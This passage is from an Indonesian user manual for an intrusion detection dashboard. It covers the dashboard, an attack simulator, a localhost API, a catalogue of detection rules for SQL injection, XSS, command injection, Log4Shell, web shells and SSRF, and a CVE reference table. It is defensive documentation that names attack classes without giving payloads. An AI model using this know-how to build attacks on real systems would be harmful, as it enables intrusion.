| **High Severity** | Jumlah event berkeparahan `HIGH` |
| **Blocked Attacks** | Jumlah event yang request-nya ditolak (HTTP 403) |
| **Unique Attackers** | Jumlah alamat IP sumber unik |
| **Active Alerts** | Jumlah alert yang belum di-*acknowledge* |

#### b. Attack Timeline (24h)

Grafik batang jumlah event per jam selama 24 jam terakhir. Berguna untuk mengenali lonjakan serangan (*spike*) dan pola waktu.

#### c. Top Attack Types

Peringkat jenis serangan terbanyak. Warna batang mengikuti tingkat keparahan jenis serangan tersebut (merah = kritis, oranye = tinggi, kuning = sedang).

#### d. Live Security Feed

Umpan *real-time* event terbaru (maksimal 50 item di layar). Setiap baris menampilkan:

- Label tingkat keparahan berwarna
- Nama aturan yang terpicu
- IP sumber, jenis serangan, metode + path
- Rujukan CVE (dapat diklik untuk membuka detail)
- Aksi (`BLOCK` atau `ALERT`)
- Waktu kejadian

> Baris baru masuk dengan animasi dari kiri dan selalu ditempatkan di paling atas.

#### e. Top Attacker IPs

10 alamat IP dengan event terbanyak beserta tingkat keparahan maksimumnya.

#### f. CVE References in Attacks

10 CVE yang paling sering terpicu oleh serangan, dengan jumlah kecocokan. Klik ID CVE untuk melihat detail.

#### g. Attack Simulator

Panel kontrol untuk menyalakan/mematikan simulator (lihat [bagian 8](#8-simulator-serangan)).

---

### 7.2 Tab CVE Database

Basis data referensi kerentanan web.

#### Cara Mencari

1. Ketik kata kunci pada kolom pencarian. Pencarian mencakup **ID CVE, judul, deskripsi, produk terdampak, dan tag**.
2. Pilih tingkat keparahan pada dropdown (All / Critical / High / Medium / Low) — opsional.
3. Tekan tombol **Search** atau tombol `Enter`.

Contoh pencarian yang berguna:

| Kata Kunci | Menemukan |
|---|---|
| `Log4j` | CVE-2021-44228 |
| `Struts` | CVE-2017-5638 |
| `traversal` | CVE-2020-3452, CVE-2010-2861, CVE-2019-3398, CVE-2019-5418 |
| `RCE` | Seluruh kerentanan eksekusi kode jarak jauh |
| `CVE-2014-0160` | Heartbleed |

#### Membaca Kartu CVE

Setiap kartu menampilkan ID CVE, skor CVSS berwarna, judul, produk & versi terdampak, ringkasan deskripsi, dan tag.

#### Detail CVE (Modal)

Klik kartu untuk membuka detail lengkap:

| Field | Penjelasan |
|---|---|
| **CVSS Score** | Nilai 0.0–10.0 yang menyatakan tingkat keparahan |
| **CVSS Vector** | Vektor metrik, mis. `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **CWE** | Klasifikasi jenis kelemahan perangkat lunak |
| **Attack Vector** | `Network` / `Local` / `Physical` |
| **Attack Complexity** | `Low` / `High` |
| **Privileges Required** | Hak akses minimum penyerang |
| **User Interaction** | Apakah korban harus melakukan interaksi |
| **Confidentiality / Integrity / Availability Impact** | Dampak terhadap ketiga aspek CIA |
| **Affected Versions** | Rentang versi rentan |
| **Patched Version** | Versi yang telah diperbaiki |
| **Remediation** | Langkah mitigasi dan perbaikan |
| **References** | Tautan ke NVD atau pengumuman vendor |
| **Published / Last Modified** | Tanggal publikasi dan pembaruan terakhir |
| **Tags** | Kata kunci (mis. `RCE`, `JNDI`, `critical`) |

#### Ambang Tingkat Keparahan CVSS

| Tingkat | Rentang Skor |
|---|---|
| `CRITICAL` | 9.0 – 10.0 |
| `HIGH` | 7.0 – 8.9 |
| `MEDIUM` | 4.0 – 6.9 |
| `LOW` | 0.1 – 3.9 |

---

### 7.3 Tab Security Events

Log lengkap seluruh kecocokan serangan.

#### Kolom Tabel

| Kolom | Isi |
|---|---|
| **Time** | Waktu kejadian (format 24 jam) |
| **Severity** | `CRITICAL` / `HIGH` / `MEDIUM` / `LOW` |
| **Attack Type** | Jenis serangan (mis. SQL Injection) |
| **Source IP** | Alamat IP penyerang |
| **Rule** | Nama aturan yang terpicu |
| **CVE** | CVE terkait (dapat diklik) |
| **Action** | `BLOCK` atau `ALERT` |
| **Path** | Endpoint yang diserang |

#### Cara Memfilter

1. Pilih **severity** pada dropdown, dan/atau
2. Isi **IP** pada kolom filter, lalu
3. Tekan **Apply Filter**.

Tombol **Refresh** memuat ulang 100 event terbaru.

> Tab ini menampilkan maksimum 100 event terbaru (filter maksimum 200). Untuk analisis historis lebih dalam, gunakan API `GET /api/events/search`.

---

### 7.4 Tab Alerts

Menampilkan alert yang **belum di-acknowledge**.

Alert dibuat otomatis hanya untuk event berkeparahan `CRITICAL` atau `HIGH`.

#### Mengelola Alert

1. Tinjau pesan alert (berisi tingkat keparahan, nama aturan, dan IP sumber).
2. Klik **Acknowledge** setelah alert ditangani.
3. Kartu akan meredup dan tombol menjadi nonaktif.

> Praktik yang disarankan: *acknowledge* hanya setelah Anda memverifikasi alert tersebut (lihat [bagian 12](#12-prosedur-operasional-standar)).

---

### 7.5 Tab IDS Rules

Daftar seluruh 27 aturan deteksi.

#### Isi Setiap Kartu Aturan

| Elemen | Arti |
|---|---|
| Nama aturan | Deskripsi singkat deteksi |
| `IDS-xxx` | Kode aturan |
| Deskripsi | Penjelasan pola yang dideteksi |
| Badge severity | Tingkat keparahan |
| Badge aksi | `BLOCK` (request ditolak) atau `ALERT` (hanya dicatat) |
| ID CVE | CVE terkait (dapat diklik) |
| Pola regex | Pola pencocokan yang digunakan |
| Tombol toggle | Menyalakan / mematikan aturan |

#### Mengaktifkan / Menonaktifkan Aturan

Klik tombol toggle. Perubahan **langsung berlaku** — mesin memuat ulang aturan tanpa perlu restart server.

> **Perhatian:** Menonaktifkan aturan `block` akan mengubah perilaku sistem dari *blocking* menjadi *monitoring* untuk jenis serangan tersebut. Gunakan hanya untuk tuning sementara.

---

### 7.6 Tab IP Reputation

Pemantauan reputasi alamat IP penyerang.

#### Cara Skor Dihitung

Setiap event menambah skor IP sumber:

| Keparahan Event | Penambahan Skor |
|---|---|
| `CRITICAL` | +25 |
| `HIGH` | +15 |
| `MEDIUM` | +5 |
| `LOW` | +1 |

Skor maksimum dibatasi **100**.

#### Tingkat Ancaman

| Tingkat | Rentang Skor | Warna |
|---|---|---|
| `CRITICAL` | ≥ 75 | Merah |
| `HIGH` | 50 – 74 | Oranye |
| `MEDIUM` | 25 – 49 | Kuning |
| `LOW` | < 25 | Hijau |

#### Memblokir IP

Klik **Block** untuk menandai IP sebagai diblokir. Status berubah menjadi `BLOCKED` (merah). Klik **Unblock** untuk membatalkan.

> **Catatan:** Penandaan blokir bersifat **pencatatan status** untuk kebutuhan analis. Pemblokiran lalu lintas nyata harus dilakukan pada *firewall* atau *reverse proxy* di depan aplikasi.

---

## 8. Simulator Serangan

Simulator membangkitkan lalu lintas serangan realistis untuk menguji mesin deteksi tanpa memerlukan penyerang sesungguhnya.

### 8.1 Menjalankan dari Dashboard

1. Buka tab **Dashboard**.
2. Pada panel **Attack Simulator**, klik **Start Simulation**.
3. Status berubah menjadi **Running** (hijau).
4. Event mulai muncul di **Live Security Feed** dan kartu statistik bertambah.
5. Klik **Stop** untuk menghentikan.

### 8.2 Menjalankan dari API

```bash
# Mulai dengan interval 3000 ms (satu serangan tiap 3 detik)
curl -X POST http://localhost:8421/api/simulate/start \
  -H "Content-Type: application/json" \
  -d "{\"interval\":3000}"

# Hentikan
curl -X POST http://localhost:8421/api/simulate/stop

# Cek status
curl http://localhost:8421/api/simulate/status
```

### 8.3 Memicu Serangan Tertentu (Satu Kali)

Berguna untuk demonstrasi terkontrol atau pengujian aturan spesifik:

```bash
curl -X POST http://localhost:8421/api/simulate/attack \
  -H "Content-Type: application/json" \
  -d "{\"attack_type\":\"Log4j Injection\"}"
```

**Nilai `attack_type` yang tersedia:**

| Nilai | Jenis Serangan |
|---|---|
| `SQL Injection` | Injeksi SQL (UNION, boolean, time-based, stacked, error-based) |
| `Cross-Site Scripting (XSS)` | XSS (script tag, event handler, JS URI, SVG) |
| `Path Traversal` | Penelusuran direktori |
| `Command Injection` | Injeksi perintah OS |
| `Log4j Injection` | Log4Shell / JNDI |
| `XXE Injection` | XML External Entity |
| `OGNL Injection` | Injeksi OGNL (Struts/Confluence) |
| `SSRF` | Server-Side Request Forgery |
| `LFI/RFI` | Local/Remote File Inclusion |
| `Web Shell` | Akses web shell |
| `Code Injection` | Injeksi kode (PHP) |
| `Scanner` | Pemindai kerentanan otomatis |

### 8.4 Catatan tentang Simulator

- Simulator **tidak** mengirim permintaan melalui jaringan. Ia memanggil mesin deteksi secara langsung, sehingga tidak menimbulkan risiko ke sistem lain.
- IP sumber disimulasikan dari daftar IP publik fiktif untuk keperluan visualisasi.
- Templat dipilih secara acak; satu jenis serangan dapat memicu aturan yang berbeda tergantung payload yang terpilih.

---

## 9. Referensi API

Basis URL: `http://localhost:8421/api`

### 9.1 Ringkasan Endpoint

| Metode | Endpoint | Fungsi |
|---|---|---|
| `GET` | `/stats` | Statistik agregat untuk dashboard |
| `GET` | `/events?limit=N` | Event terbaru (default 50) |
| `GET` | `/events/search` | Pencarian event dengan filter |
| `GET` | `/cve?q=&severity=` | Pencarian entri CVE |
| `GET` | `/cve/:id` | Detail satu CVE |
| `GET` | `/rules` | Daftar seluruh aturan IDS |
| `PUT` | `/rules/:id/toggle` | Aktif/nonaktifkan aturan |
| `GET` | `/alerts?unacknowledged=true` | Daftar alert |
| `PUT` | `/alerts/:id/acknowledge` | Tandai alert telah ditangani |
| `GET` | `/ip-reputation` | Daftar reputasi IP |
| `PUT` | `/ip-reputation/:ip/block` | Tandai IP diblokir |
| `PUT` | `/ip-reputation/:ip/unblock` | Batalkan tanda blokir |
| `POST` | `/reset` | Hapus data event/alert/reputasi |
| `POST` | `/simulate/start` | Jalankan simulator |
| `POST` | `/simulate/stop` | Hentikan simulator |
| `GET` | `/simulate/status` | Status simulator |
| `POST` | `/simulate/attack` | Picu satu serangan tertentu |

### 9.2 Detail Endpoint

#### `GET /api/stats`

Mengembalikan ringkasan statistik.

```bash
curl http://localhost:8421/api/stats
```

```json
{
  "totalEvents": 128,
  "blockedEvents": 96,
  "criticalEvents": 41,
  "highEvents": 62,
  "uniqueAttackers": 11,
  "activeAlerts": 103,
  "topAttackTypes": [{ "attack_type": "SQL Injection", "count": 22 }],
  "topAttackers": [{ "source_ip": "45.155.205.233", "count": 14, "max_severity": "CRITICAL" }],
  "recentEvents": [{ "hour": "2026-10-25 15:00:00", "count": 9 }],
  "cveMatches": [{ "matched_cve": "CVE-2021-44228", "count": 6 }]
}
```

#### `GET /api/events`

| Parameter | Tipe | Default | Keterangan |
|---|---|---|---|
| `limit` | integer | 50 | Jumlah event terbaru |

```bash
curl "http://localhost:8421/api/events?limit=10"
```

#### `GET /api/events/search`

| Parameter | Keterangan |
|---|---|
| `severity` | `CRITICAL` / `HIGH` / `MEDIUM` / `LOW` |
| `attack_type` | Jenis serangan (harus sama persis) |
| `source_ip` | Alamat IP sumber |

```bash
curl "http://localhost:8421/api/events/search?severity=CRITICAL"
curl "http://localhost:8421/api/events/search?source_ip=45.155.205.233"
```

Maksimum 200 hasil, diurutkan dari terbaru.

#### `GET /api/cve`

| Parameter | Keterangan |
|---|---|
| `q` | Kata kunci (ID, judul, deskripsi, produk, tag) |
| `severity` | `ALL` (default) / `CRITICAL` / `HIGH` / `MEDIUM` / `LOW` |

```bash
curl "http://localhost:8421/api/cve?q=Log4j"
curl "http://localhost:8421/api/cve?severity=CRITICAL"
```

#### `GET /api/cve/:id`

```bash
curl http://localhost:8421/api/cve/CVE-2021-44228
```

Mengembalikan `404` apabila CVE tidak ditemukan.

#### `GET /api/rules`

```bash
curl http://localhost:8421/api/rules
```

#### `PUT /api/rules/:id/toggle`

Membalik status aktif/nonaktif sebuah aturan.

```bash
curl -X PUT http://localhost:8421/api/rules/IDS-070/toggle
```

Respons: `{"rule_id":"IDS-070","enabled":0}`

#### `GET /api/alerts`

| Parameter | Keterangan |
|---|---|
| `unacknowledged` | `true` untuk hanya menampilkan yang belum ditangani |

```bash
curl "http://localhost:8421/api/alerts?unacknowledged=true"
```

#### `PUT /api/alerts/:id/acknowledge`

```bash
curl -X PUT http://localhost:8421/api/alerts/5/acknowledge \
  -H "Content-Type: application/json" \
  -d "{\"user\":\"analis1\"}"
```

#### `GET /api/ip-reputation`

```bash
curl http://localhost:8421/api/ip-reputation
```

#### `PUT /api/ip-reputation/:ip/block` dan `/unblock`

```bash
curl -X PUT http://localhost:8421/api/ip-reputation/45.155.205.233/block
curl -X PUT http://localhost:8421/api/ip-reputation/45.155.205.233/unblock
```

#### `POST /api/reset`

Menghapus seluruh data `security_events`, `alerts`, dan `ip_reputation`. **Data CVE dan aturan tidak dihapus.**

```bash
curl -X POST http://localhost:8421/api/reset
```

Respons: `{"status":"ok","purged":{"events":128,"alerts":103,"ips":11}}`

### 9.3 Format Respons Pemblokiran

Apabila sebuah request diblokir oleh aturan ber-aksi `block`, server mengembalikan **HTTP 403**:

```json
{
  "error": "Request blocked by IDS",
  "reason": "Malicious pattern detected",
  "severity": "CRITICAL",
  "detections": [
    {
      "rule": "Log4Shell - JNDI Lookup",
      "attack_type": "Log4j Injection",
      "severity": "CRITICAL",
      "matched_cve": "CVE-2021-44228"
    }
  ]
}
```

### 9.4 WebSocket

| Item | Nilai |
|---|---|
| URL | `ws://localhost:8421/ws` |
| Pesan masuk (server → klien) | `{"type":"events"\|"alerts"\|"stats","data":{...}}` |
| Pesan keluar (klien → server) | `{"type":"subscribe","channels":["events","alerts","stats"]}` |

---

## 10. Referensi Aturan Deteksi IDS

Total **27 aturan** aktif.

### 10.1 Tingkat Keparahan & Aksi

| Aksi | Perilaku |
|---|---|
| `block` | Event dicatat **dan** request ditolak dengan HTTP 403 |
| `alert` | Event dicatat dan memicu alert; request **tetap diteruskan** |

### 10.2 Daftar Aturan

#### Injeksi SQL (5 aturan)

| Kode | Nama | Keparahan | Aksi | CVE |
|---|---|---|---|---|
| IDS-001 | SQL Injection - UNION SELECT | CRITICAL | block | CVE-2012-2122 |
| IDS-002 | SQL Injection - Boolean Blind | HIGH | block | CVE-2012-2122 |
| IDS-003 | SQL Injection - Time-based | HIGH | block | CVE-2012-2122 |
| IDS-004 | SQL Injection - Stacked Queries | HIGH | block | CVE-2012-2122 |
| IDS-005 | SQL Injection - Error-based | HIGH | alert | CVE-2012-2122 |

#### Cross-Site Scripting / XSS (5 aturan)

| Kode | Nama | Keparahan | Aksi |
|---|---|---|---|
| IDS-010 | XSS - Script Tag Injection | HIGH | block |
| IDS-011 | XSS - Event Handler | HIGH | block |
| IDS-012 | XSS - JavaScript URI | HIGH | block |
| IDS-013 | XSS - SVG Embed | HIGH | block |
| IDS-014 | XSS - Data URI | MEDIUM | alert |

#### Path Traversal (3 aturan)

| Kode | Nama | Keparahan | Aksi | CVE |
|---|---|---|---|---|
| IDS-020 | Path Traversal - Dot-Dot-Slash | HIGH | block | CVE-2020-3452 |
| IDS-021 | Path Traversal - Absolute Path | HIGH | block | CVE-2010-2861 |
| IDS-022 | Path Traversal - Null Byte | HIGH | block | — |

#### Injeksi Perintah (3 aturan)

| Kode | Nama | Keparahan | Aksi | CVE |
|---|---|---|---|---|
| IDS-030 | Command Injection - Shell Metacharacters | CRITICAL | block | CVE-2017-5638 |
| IDS-031 | Command Injection - Backtick Substitution | HIGH | block | — |
| IDS-032 | Command Injection - PowerShell | CRITICAL | block | — |

#### Log4j / JNDI (2 aturan)

| Kode | Nama | Keparahan | Aksi | CVE |
|---|---|---|---|---|
| IDS-040 | Log4Shell - JNDI Lookup | CRITICAL | block | CVE-2021-44228 |
| IDS-041 | JNDI - LDAP/RMI/DNS | CRITICAL | block | CVE-2021-44228 |

#### XXE, OGNL, SSRF, LFI, Web Shell, Kode (6 aturan)

| Kode | Nama | Keparahan | Aksi | CVE |
|---|---|---|---|---|
| IDS-050 | XXE - External Entity Declaration | HIGH | block | CVE-2021-21307 |
| IDS-060 | OGNL Injection | CRITICAL | block | CVE-2017-5638 |
| IDS-070 | SSRF - Internal IP Access | HIGH | alert | CVE-2023-26605 |
| IDS-080 | LFI - Local File Inclusion | HIGH | block | CVE-2019-5418 |
| IDS-090 | Web Shell Upload | CRITICAL | block | — |
| IDS-091 | PHP Code Injection | CRITICAL | block | CVE-2016-10033 |

#### Pemindai & RDP (3 aturan)

| Kode | Nama | Keparahan | Aksi | CVE |
|---|---|---|---|---|
| IDS-100 | Known Scanner User-Agent | MEDIUM | alert | — |
| IDS-101 | Directory Fuzzing | MEDIUM | alert | — |
| IDS-110 | RDP Brute Force (BlueKeep check) | HIGH | block | CVE-2019-0708 |

### 10.3 Cakupan Inspeksi

Mesin IDS memeriksa permukaan input berikut:

| Permukaan | Diperiksa |
|---|---|
| URL path | Ya |
| Parameter query | Ya (per parameter) |
| Body request | Ya (JSON dan form, per field) |
| Header `User-Agent` | Ya |
| Header `Content-Type` | Ya |
| Header `Content-Disposition` | Ya |
| Header `Referer` | Ya (kecuali untuk aturan SSRF) |
| Header `Cookie` | Ya |
| Header `X-Forwarded-For` | Ya |
| Header `Authorization` | Ya |
| Header `Accept` | Ya |

> **Catatan penting:** Aturan SSRF (IDS-070) sengaja **tidak** memeriksa header. Header seperti `Referer` secara sah memuat nama host (mis. `http://localhost:8421/`), sehingga pemeriksaan header akan menghasilkan *false positive* pada setiap permintaan dari origin yang sama.

### 10.4 Menambah Aturan Baru

1. Tambahkan objek aturan pada array `idsRules` di `server/seed-cve.js`:

```javascript
{
  rule_id: 'IDS-120',
  rule_name: 'Nama Aturan Anda',
  rule_description: 'Penjelasan singkat',
  attack_type: 'Jenis Serangan',
  severity: 'HIGH',              // CRITICAL | HIGH | MEDIUM | LOW
  pattern: '(?i)pola_regex_anda', // awalan (?i) akan dilepas otomatis
  pattern_flags: 'i',
  related_cve: 'CVE-XXXX-XXXX',  // atau null
  action: 'block',               // block | alert
  enabled: 1
}
```

2. Jalankan ulang seeder:

```bash
npm run seed
```

3. Muat ulang aturan: nyalakan/matikan aturan apa pun dari tab **IDS Rules**, atau restart server.

> **Penting:** JavaScript **tidak mendukung** *inline flag* `(?i)`. Awalan `(?i)` dilepas otomatis oleh mesin dan digantikan oleh flag `i`, jadi penulisan tersebut aman. Namun **jangan** menulis grup non-capturing bergaya PCRE seperti `(?i:...)` — gunakan flag `pattern_flags` sebagai gantinya.

---

## 11. Referensi Basis Data CVE

Total **30 entri**, terdiri atas **9 CRITICAL**, **11 HIGH**, **7 MEDIUM**, dan **3 LOW**. Sebanyak **18** merupakan kerentanan yang dapat dipicu melalui input HTTP (`is_web_vuln = 1`), sedangkan **12** sisanya adalah kerentanan tingkat *runtime* atau infrastruktur yang **tidak dapat dideteksi** oleh aturan IDS (lihat [bagian 11.4](#114-cve-runtime-nodejs--mengapa-tidak-ada-aturan-ids-nya)).

### 11.1 Kerentanan yang Dapat Dipicu via Input HTTP

`is_web_vuln = 1` — 18 entri. Kerentanan pada tabel ini dapat muncul sebagai pola pada URL, *query string*, body, atau header, sehingga berpotensi ditangkap oleh aturan deteksi.

| CVE | Skor | Tingkat | Produk Terdampak | CWE |
|---|---|---|---|---|
| CVE-2016-10033 | 10.0 | CRITICAL | PHPMailer | CWE-93 |
| CVE-2017-7269 | 10.0 | CRITICAL | Microsoft IIS 6.0 (WebDAV) | CWE-119 |
| CVE-2017-5638 | 10.0 | CRITICAL | Apache Struts 2 | CWE-94 |
| CVE-2021-44228 | 10.0 | CRITICAL | Apache Log4j (Log4Shell) | CWE-502 |
| CVE-2020-7964 | 9.8 | CRITICAL | Atlassian Confluence Server | CWE-94 |
| CVE-2021-26114 | 9.8 | CRITICAL | Adobe ColdFusion | CWE-94 |
| CVE-2022-23131 | 9.1 | CRITICAL | Zabbix | CWE-287 |
| CVE-2012-2122 | 9.0 | CRITICAL | MySQL | CWE-287 |
| CVE-2019-3398 | 8.8 | HIGH | Atlassian Confluence Server | CWE-22 |
| CVE-2019-0211 | 7.8 | HIGH | Apache HTTP Server | CWE-362 |
| CVE-2019-5418 | 7.5 | HIGH | Ruby on Rails (Action Pack) | CWE-22 |
| CVE-2021-21307 | 7.5 | HIGH | Domibus | CWE-611 |
| CVE-2020-3452 | 7.5 | HIGH | Cisco ASA / FTD | CWE-22 |
| CVE-2019-16769 | 7.5 | HIGH | Ruby rexml | CWE-776 |
| CVE-2026-111497 | 7.5 | HIGH | Node.js (Brotli decoder) | CWE-787 |
| CVE-2023-26605 | 6.5 | MEDIUM | Grafana | CWE-918 |
| CVE-2014-0160 | 5.0 | MEDIUM | OpenSSL (Heartbleed) | CWE-126 |
| CVE-2010-2861 | 5.0 | MEDIUM | Adobe ColdFusion | CWE-22 |

### 11.2 Kerentanan Runtime & Infrastruktur

`is_web_vuln = 0` — 12 entri. Kerentanan pada tabel ini berada di lapisan *runtime*, protokol, atau layanan infrastruktur. Mitigasinya adalah **patch versi**, bukan penyaringan lalu lintas.

| CVE | Skor | Tingkat | Produk Terdampak | CWE |
|---|---|---|---|---|
| CVE-2019-0708 | 9.8 | CRITICAL | Microsoft Windows RDP (BlueKeep) | CWE-119 |
| CVE-2017-7494 | 8.8 | HIGH | Samba (SambaCry) | CWE-94 |
| CVE-2026-105482 | 7.5 | HIGH | Node.js (`dns.resolve()` NUL truncation) | CWE-158 |
| CVE-2026-106069 | 7.4 | HIGH | Node.js (TLS hostname bypass) | CWE-297 |
| CVE-2026-105483 | 7.4 | HIGH | Node.js (TLS hostname bypass, fullwidth digits) | CWE-297 |
| CVE-2008-1447 | 6.8 | MEDIUM | Multiple DNS Resolvers | CWE-16 |
| CVE-2026-106074 | 6.5 | MEDIUM | Node.js (predictable random in SEA/snapshot) | CWE-338 |
| CVE-2026-105481 | 5.3 | MEDIUM | Node.js (keep-alive desync) | CWE-444 |
| CVE-2026-106072 | 5.3 | MEDIUM | Node.js (non-canonical IPv4 hostname) | CWE-297 |
| CVE-2026-106070 | 3.7 | LOW | Node.js (ZipFile prefix leak) | CWE-200 |
| CVE-2026-106073 | 3.6 | LOW | Node.js (Permission Model via `fs.realpathSync`) | CWE-59 |
| CVE-2026-106071 | 3.3 | LOW | Node.js (Permission Model wildcard over-grant) | CWE-732 |

### 11.3 Menambah Entri CVE

Tambahkan objek ke array `cveEntries` di `server/seed-cve.js`, lalu jalankan `npm run seed`. Field yang wajib diisi:

`cve_id`, `title`, `description`, `cvss_score`, `cvss_severity`, `affected_product`, `affected_versions`, `patched_version`, `remediation`.

Field opsional: `cvss_vector`, `attack_vector`, `attack_complexity`, `privileges_required`, `user_interaction`, `scope`, `confidentiality_impact`, `integrity_impact`, `availability_impact`, `cwe_id`, `references`, `published_date`, `last_modified`, `is_web_vuln`, `tags`.

> Data CVE resmi dapat diambil dari [NVD](https://nvd.nist.gov/) atau [CVE.org](https://www.cve.org/). Pastikan `cvss_severity` konsisten dengan `cvss_score` mengikuti ambang pada [bagian 7.2](#72-tab-cve-database).

### 11.4 CVE Runtime Node.js — Mengapa Tidak Ada Aturan IDS-nya

Sebagai contoh konkret dari pemisahan pada [bagian 11.2](#112-kerentanan-runtime--infrastruktur), 10 CVE dari *security release* Node.js tanggal 21 Oktober 2026 telah dimasukkan ke basis data. **Tidak satu pun** memiliki aturan deteksi IDS, dan itu memang disengaja.

**Alasannya:** aturan IDS bekerja dengan mencocokkan pola pada input HTTP (URL, *query*, body, header). Sepuluh CVE ini adalah cacat pada **memori, TLS, DNS, kriptografi, dan permission model** di dalam proses Node.js. Eksploitasinya tidak menghasilkan pola khas pada permintaan HTTP — sebuah request yang memicu *out-of-bounds write* di decoder Brotli terlihat seperti request biasa yang sah.

| CVE | Ringkas | Tingkat | Terdampak |
|---|---|---|---|
| CVE-2026-111497 | *Out-of-bounds write* pada decoder Brotli → RCE | HIGH | 22.x / 24.x / 26.x |
| CVE-2026-106069 | Bypass verifikasi hostname TLS (resolusi IP longgar) | HIGH | 22.x / 24.x / 26.x |
| CVE-2026-105483 | Bypass verifikasi hostname TLS (digit fullwidth) | HIGH | 24.x / 26.x |
| CVE-2026-105482 | `dns.resolve()` memotong nama ber-byte NUL | HIGH | 22.x / 24.x / 26.x |
| CVE-2026-105481 | Desinkronisasi respons pada socket keep-alive | MEDIUM | 22.x / 24.x / 26.x |
| CVE-2026-106072 | Hostname IPv4 non-kanonik lolos autentikasi sertifikat | MEDIUM | 22.x / 24.x / 26.x |
| CVE-2026-106074 | `randomUUID()`/`randomInt()` identik pada SEA & snapshot | MEDIUM | 22.x / 24.x / 26.x |
| CVE-2026-106070 | `ZipFile` membocorkan byte prefix | LOW | 26.x |
| CVE-2026-106071 | Permission Model *over-grant* via wildcard | LOW | 26.x |
| CVE-2026-106073 | Permission Model bypass via `fs.realpathSync` | LOW | 22.x / 24.x / 26.x |

**Yang harus dilakukan (bukan tuning aturan):**

1. Periksa versi: `node -v`.
2. Bandingkan dengan versi patch: **22.23.4**, **24.22.1**, atau **26.12.1** sesuai lini versi.
3. Jika lebih rendah, lakukan *upgrade*. Untuk lini EOL (20.x dan lebih lama) tidak ada patch upstream — gunakan dukungan *extended lifecycle* pihak ketiga atau naikkan lini versi.
4. Khusus CVE-2026-106074: setelah *upgrade*, **bangun ulang** SEA/startup snapshot. Artefak lama tetap membawa cache entropi yang sudah tercemar.
5. Setelah patch, catat versi baru pada *change log* instansi. Status "terpantau" di dashboard **tidak** berarti "sudah ter-patch".

**Cara membaca hasil pencarian di dashboard:** cari `node` pada tab *CVE Database*. Sepuluh entri akan muncul dengan tag `runtime`. Kehadirannya di basis data berarti **referensi**, bukan berarti sistem Anda rentan. Status kerentanan ditentukan oleh versi Node.js yang benar-benar Anda jalankan, yang hanya dapat diketahui lewat pemeriksaan versi — di luar cakupan CyberWatch IDS.

> Keterbatasan ini berlaku umum, bukan hanya untuk Node.js: **CyberWatch IDS mendeteksi percobaan serangan, bukan keberadaan kerentanan.** Manajemen *patch* tetap merupakan kontrol yang terpisah dan wajib.

---

## 12. Prosedur Operasional Standar

### 12.1 Alur Triase Alert

```
Alert muncul (HIGH/CRITICAL)
        │
        ▼
1. Buka tab Alerts → baca pesan, aturan, dan IP sumber
        │
        ▼
2. Cek tab Security Events (filter IP tersebut)
   → lihat apakah ada pola berulang / eskalasi
        │
        ▼
3. Buka tab IP Reputation → periksa skor & tingkat ancaman
        │
        ▼
4. Klik rujukan CVE pada event → baca remediasi
        │
        ├── Serangan nyata & berulang ──▶ Block IP,
        │                                 periksa log server/aplikasi,
        │                                 patch kerentanan terkait
        │
        └── False positive ────────────▶ Catat, nonaktifkan aturan
                                          terkait bila perlu (tab IDS Rules),
                                          lalu Acknowledge alert
```

### 12.2 Prioritas Penanganan

| Keparahan | Target Respons | Tindakan |
|---|---|---|
| `CRITICAL` | Segera | Isolasi sumber, verifikasi integritas, patch |
| `HIGH` | < 4 jam | Investigasi, blokir IP bila berulang |
| `MEDIUM` | < 24 jam | Tinjau, pantau tren |
| `LOW` | Berkala | Catat dalam laporan |

### 12.3 Tuning Aturan

Apabila terjadi *false positive* berulang:

1. Identifikasi aturan pemicu dari tab **Security Events** (kolom `Rule`).
2. Verifikasi bahwa permintaan tersebut memang sah.
3. Nonaktifkan aturan sementara melalui tab **IDS Rules**.
4. Sesuaikan pola regex pada `server/seed-cve.js`, lalu jalankan ulang `npm run seed`.

### 12.4 Pemeriksaan Rutin

| Frekuensi | Kegiatan |
|---|---|
| Harian | Tinjau alert baru dan event `CRITICAL` |
| Mingguan | Tinjau tren di tab Dashboard; identifikasi IP berulang |
| Bulanan | Perbarui basis data CVE dengan kerentanan terbaru; evaluasi efektivitas aturan |
| Berkala | Arsipkan data event lama, lalu reset bila diperlukan |

---

## 13. Perawatan dan Reset Data

### 13.1 Penyimpanan Otomatis

Basis data disimpan ke disk **secara otomatis setiap 5 detik** dan juga saat server dihentikan dengan benar. Tidak diperlukan tindakan manual untuk menyimpan data.

### 13.2 Mencadangkan Basis Data

Cukup salin berkas:

```bash
cp data/cve-database.db data/backup-cve-database-$(date +%Y%m%d).db
```

**Windows CMD:**
```cmd
copy data\cve-database.db data\backup-cve-database.db
```

### 13.3 Mengosongkan Data Event

Gunakan endpoint reset (data CVE dan aturan tetap aman):

```bash
curl -X POST http://localhost:8421/api/reset
```

Atau melalui dashboard: muat ulang halaman setelah reset.

### 13.4 Membangun Ulang Basis Data dari Nol

```bash
# Hentikan server terlebih dahulu (Ctrl + C)
rm data/cve-database.db      # Windows: del data\cve-database.db
npm run seed
npm start
```

> **Peringatan:** Perintah ini menghapus **seluruh** data termasuk CVE dan aturan kustom. Cadangkan lebih dahulu apabila Anda telah menambahkan entri sendiri.

### 13.5 Estimasi Ukuran Data

Satu event memerlukan sekitar 500–800 byte. Dengan simulator berjalan pada interval 3 detik, dalam 24 jam akan terbentuk sekitar 28.800 event (± 20 MB). Untuk pemakaian jangka panjang, lakukan reset atau arsipkan secara berkala.

---

## 14. Pemecahan Masalah

| Gejala | Kemungkinan Penyebab | Solusi |
|---|---|---|
| `Error: listen EADDRINUSE` | Port 8421 sudah dipakai | Hentikan proses lain, atau jalankan dengan `PORT=9000 npm start` |
| Dashboard kosong / "Waiting for security events..." | Belum ada lalu lintas | Jalankan simulator: **Start Simulation** |
| Status koneksi "Reconnecting..." | WebSocket terputus | Pastikan server berjalan; muat ulang halaman |
| Basis data kosong setelah `npm start` | Seeder belum dijalankan | Jalankan `npm run seed` |
| `Cannot find module 'sql.js'` | Dependensi belum terpasang | Jalankan `npm install` |
| Aturan tidak termuat | Pola regex tidak valid | Periksa log server: `[IDS] Invalid regex for rule ...` |
| Statistik tidak bertambah | Middleware IDS tidak aktif | Pastikan server dijalankan dari `server/index.js` |
| Grafik "Top Attack Types" kosong | Belum ada event terklasifikasi | Picu serangan melalui simulator |
| Semua request diblokir | Aturan terlalu agresif | Nonaktifkan aturan terkait di tab **IDS Rules** |
| Perubahan aturan tidak berlaku | Cache aturan | Toggle ulang aturan, atau restart server |

### 14.1 Memeriksa Kesehatan Sistem

